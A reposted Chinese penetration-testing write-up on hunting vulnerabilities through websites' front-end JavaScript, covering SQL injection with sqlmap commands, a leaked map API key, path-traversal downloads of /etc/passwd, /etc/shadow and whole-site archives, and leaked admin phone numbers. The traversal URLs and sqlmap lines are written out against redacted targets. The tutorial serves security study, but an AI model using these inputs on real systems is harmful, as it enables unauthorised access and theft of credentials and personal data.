#  JS中的漏洞信息   
先知社区-bcloud  安全小白团   2025-01-12 06:31  
  
forever young  
  
  
  
不论昨天如何，都希望新的一天里，我们大家都能成为更好的人，也希望我们都是走向幸福的那些人  
  
  
01  
  
背景  
  
安全小白团  
  
  
当我们拿到网站，但是又不知道密码，目录扫描也扫不出有效的信息时，我们可以从前端JS源码入手，找找是否有可以利用的点，或者未授权的接口从而一步一步扩大危害，拿到系统源码或者用户信息等。  
  
  
  
02  
  
SQL注入  
  
安全小白团  
  
  
登录框开局必出货，hhh  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc8bdZpoAm6q0faXl7ICB4Zfs8mtuMmZUicGqKre2UEHN2mAwB4ibtkPuaw/640?wx_fmt=png&from=appmsg "")  
  
查看前端源码，发现Identity_Get接口，且存在userid和researchid参数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc8c9Qb28uSNkyGAZkG3qXFjKSGEwpB89B2EAWzIGGI9KV2hX9oH5PYHQ/640?wx_fmt=png&from=appmsg "")  
  
访问该接口抓包，使用burp进行测试，通过单引号重放发生报错  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc8l7454PMawG0OeJyYW6ZUHckHKobQQQRAWRN8Zib9HoiczvSTxTWClNag/640?wx_fmt=png&from=appmsg "")  
  
SQLMAP直接一键梭哈  
```
python sqlmap.py -u "http://ip/Api/xxx/xxx/xxx/Identity_Get?USERID=1&RESEARCHID=1" --batch --risk 3
```  
  
Oracle数据库  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc80DFDBq55CNY3LY2lJaIz1JRbXtQcXNBhE3zaTYx5TyuUllhJCQbmzg/640?wx_fmt=png&from=appmsg "")  
  
查询当前数据库用户  
```
python sqlmap.py -u "http://ip/Api/xxx/xxx/xxx/Identity_Get?USERID=1&RESEARCHID=1" --batch --risk 3 --current-user
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc8EEOP6we3Q75Q2rMQUJagqzdJ2HGeGjjqtczbicDtAhXubG46eLQKgqw/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
地图key泄露  
  
安全小白团  
  
  
这个KEY泄露虽然很常见，但是能用的不多，这个能够利用的我还是第一次遇见：高德地图key  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc8TqINfibXpzhJe01NjL2JiaSlqpVdUOv5T9oAMK8sO9HDL9n4LG4WRu3A/640?wx_fmt=png&from=appmsg "")  
  
  
此key有效，hhh  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc8ftsvqh8IaA7XlhOblKlBibMe6iayYibicseEEHfxqhu3nCuymKLEuwNBEQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
04  
  
文件下载一  
  
安全小白团  
  
  
访问网站打开插件查看接口信息，发现/xxx/xxx/zipDownload，一看这种就有戏啊  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc86bncnagqmvibIb0EVy9Nbql8QBEggf4tBIpErNb9C9Qnpap1icrfj9fA/640?wx_fmt=png&from=appmsg "")  
  
访问连接，通过提示信息输入path和type参数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc8ia6YAOc4adNyTMytZRW44BSy4nia3LTe1wZHd62QWTez1o3ULJLRI6Aw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc8kLnA5Cgdr1ILkYf9AhmkbWrDXvlDUpzawIwMiahqsLuwgTNjvOBAKeQ/640?wx_fmt=png&from=appmsg "")  
  
直接目录遍历下载  
  
https://ip/xxx/xxx/zipDownload？  
  
type=1&path=/../../../../../../..//etc/passwd  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc89f2hsVf21qCcicgPHuoc0S9cS3opwegyXGf12DiaDoyicCgFqe9uEmYqg/640?wx_fmt=png&from=appmsg "")  
  
发现shadow密码文件也可以进行下载，猜测网站用户为root权限  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc8Xbvnh8GeJY5TbFuYLkoBq3eTZluTRzN6jIDbC8siaw6nDvP6TgrlWKg/640?wx_fmt=png&from=appmsg "")  
后面就是FUZZ下源码，或者SSH私钥登录，直接拿下shell，美滋滋  
  
  
05  
  
文件下载二  
  
安全小白团  
  
访问网站，打开熊猫插件发现一个export的接口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc8OBrgzQjQxcTXdWXLVA855URMEHbqbo9ibVhgtE1QnNR9UB3BibAph0rA/640?wx_fmt=png&from=appmsg "")  
  
直接使用目录穿越，可把整个网站打包下来，包括数据库备份信息，源码甚至是中间件  
  
http://ip/xxx/Opt/export?path=../../  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc8zqWNVtATk631n4vRI8zNWgP3UbPqfyTROCiciaLvjrymPxmv3rwjIbEw/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
信息泄露  
  
安全小白团  
  
这个其实危害感觉不大，只泄露了用户名，手机号等一些信息，但是这个网站SRC的，所以还有20元子赏金，hhh  
  
查看前端const.js文件，发现两个管理员用户信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc8RcGSxt8iaweAGTQVlah9y1l6jVVQtGReIzu90qneh8JqmC3WnkkPvCg/640?wx_fmt=png&from=appmsg "")  
  
直接在找回密码处输入用户名密码，获取到手机号信息  
  
如下图1：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc8G0RXHvm1JIZhn4Nr64eYglTQXrhiaTniaXVHoticEvc1oL1AMsoAiaqCXw/640?wx_fmt=png&from=appmsg "")  
  
如下图2：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaRRjnyouAH9aQzicamQNJcc8eJCKibdfOCuJ18McNV2ylTjqFf69PNbiby6CAdylM5cZiaOZ8mONRibiaicw/640?wx_fmt=png&from=appmsg "")  
  
只有两个账号，泄露的东西也不多，所以赏金不高，hhh  
  
  
  
文章作者：先知社区（bcloud）  
  
文章来源：https://xz.aliyun.com/t/16954  
  
  
  
  
07  
  
免责&版权声明  
  
安全小白团  
  
  
  
安全小白团是帮助用户了解信息安全技术、安全漏洞相关信息的微信公众号。安全小白团提供的程序(方法)可能带有攻击性，仅供安全研究与教学之用，用户将其信息做其他用途，由用户承担全部法律及连带责任，安全小白团不承担任何法律及连带责任。  
欢迎大家转载，  
转载请注明出处。  
如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibD3eiadibk24n9ZpNWjGeupprSs1sGgVzwVia9kyRkCfIVoCwiabC5ofVva3IwGATflpYTCKhbO7fIAHr0Bic1V5VhQ/640?wx_fmt=png "")  
  
往期推荐  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KibxxUs6coRpltxRj9zSuG0vdHibDsC6q4HiaaS4BYPPrro0nrvHmNicpVbQfAr3x2pbEEzXqqicLkYkstwzTW6f5dQ/640?wx_fmt=png "")  
  
  
- [windows提权哪有那么难?](https://mp.weixin.qq.com/s?__biz=MzU2NzY5MjAwNQ==&mid=2247486386&idx=1&sn=018bed438684d4740b9c27a3576e6b73&scene=21#wechat_redirect)  
  
  
- [滥用快捷键进行初始访问和持久化](https://mp.weixin.qq.com/s?__biz=MzU2NzY5MjAwNQ==&mid=2247485326&idx=1&sn=547033186957f482e3bed4b8095faf91&scene=21#wechat_redirect)  
  
  
- [容器逃逸的7种方式 0x3](https://mp.weixin.qq.com/s?__biz=MzU2NzY5MjAwNQ==&mid=2247485824&idx=1&sn=1c285807e479eaa4ed8214cf7e9b0361&scene=21#wechat_redirect)  
  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaic181R2RnYicpic6GbdiazMpqiaIrCaa2fbjKHtn8kiayKGGBeW0icqgpfzNqmibShxqsn2DMDggpaxnKjrY1sCWZXWng/640?wx_fmt=png "")  
  
转发  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ItKicuUNQ9EMVAsW4tKUASR3dbCFrBib4ibY05IeDzhxf9b1KMxjzLaukAYt0NfYLchE5eibmaSHibiamfT9wDQibytww/640?wx_fmt=png "")  
  
收藏  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jwUk1NOJTytvIJd6VYGIIp4cA0qNKtMv7tAziatxhK4whicjTxAPklWUEfjejWvRbEbJjKDoRhZpUaPaEibpFYbcQ/640?wx_fmt=png "")  
  
点赞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/K2CMDET8V6nLGsmoNxVfZytJuZzowIia6LuVg70JTa2jGiaozMwyvhG9eKOKVa5rzaj1QOgfPm4a2lsEJ7GN7zCQ/640?wx_fmt=png "")  
  
在看  
  
